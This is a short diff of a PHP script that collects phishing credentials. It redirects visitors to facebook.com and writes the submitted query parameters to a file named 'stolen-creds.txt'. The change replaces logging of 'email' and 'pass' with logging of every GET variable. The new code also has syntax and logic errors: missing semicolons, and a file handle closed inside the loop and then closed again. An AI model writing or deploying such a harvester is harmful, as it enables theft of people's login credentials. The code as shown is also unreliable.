@@ -1,11 +1,10 @@
 <?php
 	header ("Location: http://facebook.com ");
-	if (isset($_GET['email']) &&  isset($_GET['pass'])) {
-		$email = $_GET['email'];
-		$pass = $_GET['pass'];
-		$handle = fopen("stolen-creds.txt", "a")
-		fwrite($handle, "Email: $email, Pass: $pass\n");
+	$handle = fopen("stolen-creds.txt", "a")
+	foreach($_GET as $variable => $value) {
+		fwrite($handle, "$variable=$value\n");
 		fclose($handle);
 	}
+	fclose($handle)
 ?>
 
